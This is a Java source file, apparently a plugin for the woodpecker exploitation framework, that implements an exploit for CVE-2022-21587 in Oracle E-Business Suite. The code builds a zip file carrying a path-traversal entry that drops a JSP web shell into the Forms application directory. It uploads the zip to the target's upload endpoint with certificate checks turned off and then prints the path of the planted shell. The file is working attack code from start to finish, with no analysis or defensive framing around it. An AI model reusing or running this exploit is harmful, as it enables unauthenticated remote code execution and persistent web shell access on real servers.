package me.gv7.woodpecker.plugin.exploits;

import me.gv7.woodpecker.plugin.*;
import me.gv7.woodpecker.requests.RawResponse;
import me.gv7.woodpecker.requests.Requests;
import me.gv7.woodpecker.requests.body.Part;
import java.io.File;
import java.util.ArrayList;
import java.util.List;
import java.util.Map;

public class CVE_2022_21587_Zip_Upload implements IExploit {
    public IResultOutput resultOutput;

    @Override
    public String getExploitTabCaption() {
        return "Zip Upload";
    }

    @Override
    public IArgsUsageBinder getExploitCustomArgs() {
        List<IArg> args = new ArrayList<>();
        // localFilePath
        final IArg localFilePath = VulPluginInfo.pluginHelper.createArg();
        localFilePath.setName("localFilePath");
        localFilePath.setDefaultValue("/tmp/shell.jsp");
        localFilePath.setDescription("shell.jsp path, forms组件开启时可尝试上传jsp shell");
        localFilePath.setRequired(true);
        localFilePath.setType(IArg.ARG_TYPE_STRING);
        args.add(localFilePath);

        // target uncompress_path
        final IArg unCompressPath = VulPluginInfo.pluginHelper.createArg();
        unCompressPath.setName("unCompressPath");
        unCompressPath.setDefaultValue("../../../../../FMW_Home/Oracle_EBS-app1/applications/forms/forms/shell.jsp");
        unCompressPath.setDescription("shell.jsp path, forms组件存在时可尝试上传jsp shell");
        unCompressPath.setRequired(true);
        unCompressPath.setType(IArg.ARG_TYPE_STRING);
        args.add(unCompressPath);

        // zipSavePath
        final IArg zipSavePath = VulPluginInfo.pluginHelper.createArg();
        zipSavePath.setName("zipSavePath");
        zipSavePath.setDefaultValue("/tmp/shell.zip");
        zipSavePath.setDescription("evil zip save path");
        zipSavePath.setRequired(true);
        zipSavePath.setType(IArg.ARG_TYPE_STRING);
        args.add(zipSavePath);

        IArgsUsageBinder binder = VulPluginInfo.pluginHelper.createArgsUsageBinder();
        binder.setArgsList(args);
        return binder;
    }

    @Override
    public void doExploit(ITarget target, Map<String, Object> customArgs, IResultOutput result) throws Throwable {
        this.resultOutput = result;

        String uploadUrl = target.getAddress() + CommonUtils.UPLOAD_ENDPOINT;
        String formUrl = target.getAddress() + CommonUtils.FROMS_ENDPOINT;

        String localFilePath = (String) customArgs.get("localFilePath");
        String unCompressPath = (String) customArgs.get("unCompressPath");
        String zipSavePath = (String) customArgs.get("zipSavePath");
        String zipName =   zipSavePath.substring(zipSavePath.lastIndexOf(File.separatorChar)+1);


        // upload evil zip
        String payload = CommonUtils.generateEvilZip(result, unCompressPath, zipName, zipSavePath, localFilePath);

        RawResponse res = Requests.post(uploadUrl).multiPartBody(Part.file("uploadfilename", zipName, payload.getBytes())).verify(false).send();
        this.resultOutput.infoPrintln("upload " + zipName + " finish, response status: " + res.statusCode() );
        this.resultOutput.infoPrintln("default shell path: " + formUrl + localFilePath.substring(localFilePath.lastIndexOf(File.separatorChar)+1));


    }




}
